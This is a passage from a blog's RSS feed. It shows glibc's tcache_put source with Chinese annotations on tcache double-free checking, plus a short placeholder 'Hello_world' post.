&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt" id="hl-1-1">&lt;a class="lnlinks" href="#hl-1-1"> 1&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-2">&lt;a class="lnlinks" href="#hl-1-2"> 2&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-3">&lt;a class="lnlinks" href="#hl-1-3"> 3&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-4">&lt;a class="lnlinks" href="#hl-1-4"> 4&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-5">&lt;a class="lnlinks" href="#hl-1-5"> 5&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-6">&lt;a class="lnlinks" href="#hl-1-6"> 6&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-7">&lt;a class="lnlinks" href="#hl-1-7"> 7&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-8">&lt;a class="lnlinks" href="#hl-1-8"> 8&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-9">&lt;a class="lnlinks" href="#hl-1-9"> 9&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-10">&lt;a class="lnlinks" href="#hl-1-10">10&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-11">&lt;a class="lnlinks" href="#hl-1-11">11&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-12">&lt;a class="lnlinks" href="#hl-1-12">12&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-13">&lt;a class="lnlinks" href="#hl-1-13">13&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-14">&lt;a class="lnlinks" href="#hl-1-14">14&lt;/a>
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="n">__always_inline&lt;/span> &lt;span class="kt">void&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">tcache_put&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">mchunkptr&lt;/span> &lt;span class="n">chunk&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">tc_idx&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">tcache_entry&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">tcache_entry&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nf">chunk2mem&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">chunk&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/* Mark this chunk as &amp;#34;in the tcache&amp;#34; so the test in _int_free will
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> detect a double free. */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">e&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">tcache&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//设置所属的tcache
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">e&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">tcache&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">entries&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">tc_idx&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="c1">//单链表头插法
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">tcache&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">entries&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">tc_idx&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">++&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tcache&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">counts&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">tc_idx&lt;/span>&lt;span class="p">]);&lt;/span> &lt;span class="c1">//计数增加
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>

&lt;p>tcache double free 检查&lt;/p></description></item><item><title>Hello_world</title><link>/posts/hello_world/</link><pubDate>Mon, 14 Apr 2025 20:18:58 +0800</pubDate><guid>/posts/hello_world/</guid><description>&lt;p>md test~ 🤔&lt;/p></description></item></channel></rss>